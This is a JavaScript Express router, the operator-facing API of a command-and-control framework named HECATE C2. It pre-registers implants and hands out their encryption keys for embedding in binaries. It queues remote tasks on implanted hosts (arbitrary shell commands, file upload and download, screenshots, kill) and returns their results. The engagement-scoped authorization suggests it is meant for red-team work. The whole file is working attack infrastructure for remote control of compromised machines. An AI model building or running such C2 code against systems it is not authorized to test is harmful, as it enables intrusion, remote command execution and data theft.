'use strict';

/**
 * HECATE C2 — API Routes
 * Operator interface. NOT the implant beacon endpoint.
 * Mounted at /api/v1/c2 by main router.
 *
 * Beacon endpoint (implant comms) is at /c2/beacon — handled by the
 * HTTP listener separately to avoid conflating operator auth with
 * implant auth (implants use per-implant AES keys, not the operator token).
 */

const { Router }      = require('express');
const { randomUUID }  = require('crypto');
const c2Store         = require('../storage/c2-store');
const beaconStore     = require('../beacon/beacon-store');
const taskQueue       = require('../implant/task-queue');
const taskBuilder     = require('../tasks/task-builder');
const protocol        = require('../implant/protocol');
const profile         = require('../implant/profile');
const { HecateError } = require('../../../api/middleware/error-handler');
const { requireEngagement, requireResource } = require('../../../core/auth/authorization');

const router = Router();

// ── Implant management ────────────────────────────────────────────────────────

// GET /c2/implants?eid=
router.get('/implants', async (req, res, next) => {
  try {
    const engagementId = req.query.eid ?? null;
    if (engagementId) requireEngagement(req, engagementId);
    const records  = engagementId ? c2Store.listImplants(engagementId) : c2Store.listImplantsForOperator(req.hecateOperatorId);
    const allowed = new Set(records.map(r => r.id));
    const beacons  = beaconStore.list().filter(b => allowed.has(b.implantId));
    const bMap     = new Map(beacons.map(b => [b.implantId, b]));

    const implants = records.map(r => ({
      id:           r.id,
      engagementId: r.engagement_id,
      os:           r.os,
      hostname:     r.hostname,
      user:         r.user_name,
      integrity:    r.integrity,
      ip:           r.ip,
      state:        bMap.get(r.id)?.state ?? r.state,
      lastSeen:     r.last_seen,
      sleepSec:     r.sleep_sec,
      queued:       taskQueue.size(r.id),
    }));

    res.json({ implants, total: implants.length });
  } catch (err) { next(err); }
});

// GET /c2/implants/stats
router.get('/implants/stats', (req, res, next) => {
  try {
    const engagementId = req.query.eid ?? null;
    if (engagementId) requireEngagement(req, engagementId);
    res.json(engagementId ? beaconStore.stats(engagementId) : c2Store.statsForOperator(req.hecateOperatorId));
  } catch (err) { next(err); }
});

// POST /c2/implants — register a new implant (pre-provision before deployment)
router.post('/implants', async (req, res, next) => {
  try {
    const { engagementId, profileId, sleepSec, jitterPct } = req.body ?? {};
    if (!engagementId) throw new HecateError('HECATE_BAD_INPUT', 'engagementId required');
    requireEngagement(req, engagementId);

    const id  = randomUUID();
    const key = protocol.generateKey();

    await c2Store.registerImplant({ id, engagementId, profileId, key, sleepSec, jitterPct });

    // Return key as base64 — operator embeds this in the implant at build time
    // This is the ONLY time the plaintext key is returned
    res.status(201).json({
      implant: { id, engagementId, sleepSec: sleepSec ?? 30, jitterPct: jitterPct ?? 20 },
      key:     key.toString('base64'),   // embed in implant binary
      warning: 'Key returned once only — store securely or regenerate',
    });
  } catch (err) { next(err); }
});

// DELETE /c2/implants/:id — kill implant
router.delete('/implants/:id', async (req, res, next) => {
  try {
    const id = req.params.id;
    const implant = await c2Store.getImplant(id);
    requireResource(req, implant, 'Implant');
    taskBuilder.die(id, 'operator');
    beaconStore.kill(id);
    c2Store.killImplant(id);
    res.json({ ok: true, implantId: id, status: 'killed' });
  } catch (err) { next(err); }
});

// ── Tasks ─────────────────────────────────────────────────────────────────────

// GET /c2/implants/:id/tasks?status=
router.get('/implants/:id/tasks', async (req, res, next) => {
  try {
    const implant = await c2Store.getImplant(req.params.id);
    requireResource(req, implant, 'Implant');
    const queued  = taskQueue.peek(req.params.id);
    const stored  = c2Store.listTasks(req.params.id, req.query.status ?? null);
    res.json({ queued, stored, totalQueued: queued.length, totalStored: stored.length });
  } catch (err) { next(err); }
});

// POST /c2/implants/:id/tasks — enqueue a task
router.post('/implants/:id/tasks', async (req, res, next) => {
  try {
    const { type, cmd, path: remotePath, content, sleepSec, jitterPct, reason } = req.body ?? {};
    if (!type) throw new HecateError('HECATE_BAD_INPUT', 'type required');

    const id = req.params.id;
    const implant = await c2Store.getImplant(id);
    requireResource(req, implant, 'Implant');
    let task;

    switch (type) {
      case 'shell':      task = taskBuilder.shell(id, cmd);                              break;
      case 'sysinfo':    task = taskBuilder.sysinfo(id);                                 break;
      case 'upload':     task = taskBuilder.upload(id, remotePath);                      break;
      case 'download':   task = taskBuilder.download(id, remotePath, content);           break;
      case 'sleep':      task = taskBuilder.sleep(id, sleepSec, jitterPct);              break;
      case 'screenshot': task = taskBuilder.screenshot(id);                              break;
      case 'die':        task = taskBuilder.die(id, reason);                             break;
      default: throw new HecateError('HECATE_BAD_INPUT', `Unknown task type: ${type}`);
    }

    res.status(202).json({ task: { id: task.id, type: task.type, status: 'queued' } });
  } catch (err) { next(err); }
});

// DELETE /c2/implants/:id/tasks/:taskId — cancel queued task
router.delete('/implants/:id/tasks/:taskId', async (req, res, next) => {
  try {
    const implant = await c2Store.getImplant(req.params.id);
    requireResource(req, implant, 'Implant');
    const ok = taskQueue.cancel(req.params.id, req.params.taskId);
    if (!ok) throw new HecateError('HECATE_NOT_FOUND', 'Task not found in queue (may be claimed)');
    res.status(204).end();
  } catch (err) { next(err); }
});

// ── Results ───────────────────────────────────────────────────────────────────

// GET /c2/implants/:id/results?limit=
router.get('/implants/:id/results', async (req, res, next) => {
  try {
    const implant = await c2Store.getImplant(req.params.id);
    requireResource(req, implant, 'Implant');
    const limit   = parseInt(req.query.limit ?? '50', 10);
    const results = await c2Store.listResults(req.params.id, limit);
    res.json({ results, total: results.length });
  } catch (err) { next(err); }
});

// GET /c2/tasks/:taskId/result — single task result
router.get('/tasks/:taskId/result', async (req, res, next) => {
  try {
    const result = await c2Store.getResult(req.params.taskId);
    if (result) { const implant = await c2Store.getImplant(result.implant_id); requireResource(req, implant, 'Task result'); }
    if (!result) throw new HecateError('HECATE_NOT_FOUND', 'Result not found');
    res.json({ result });
  } catch (err) { next(err); }
});

// ── Profiles ──────────────────────────────────────────────────────────────────

// GET /c2/profiles
router.get('/profiles', (req, res) => {
  res.json({ profiles: profile.list(), defaults: profile.DEFAULT_PROFILE });
});

// POST /c2/profiles
router.post('/profiles', (req, res, next) => {
  try {
    const p = { ...profile.DEFAULT_PROFILE, ...(req.body ?? {}) };
    profile.validate(p);
    const created = profile.create(req.body);
    res.status(201).json({ profile: created });
  } catch (err) {
    if (err.message && !err.code) {
      return next(new (require('../../../api/middleware/error-handler').HecateError)('HECATE_BAD_INPUT', err.message));
    }
    next(err);
  }
});

// ── Status ────────────────────────────────────────────────────────────────────

router.get('/status', (req, res, next) => {
  try {
    const records = c2Store.listImplantsForOperator(req.hecateOperatorId);
    res.json({ stats: c2Store.statsForOperator(req.hecateOperatorId), implants: records.length });
  } catch (err) { next(err); }
});

module.exports = router;
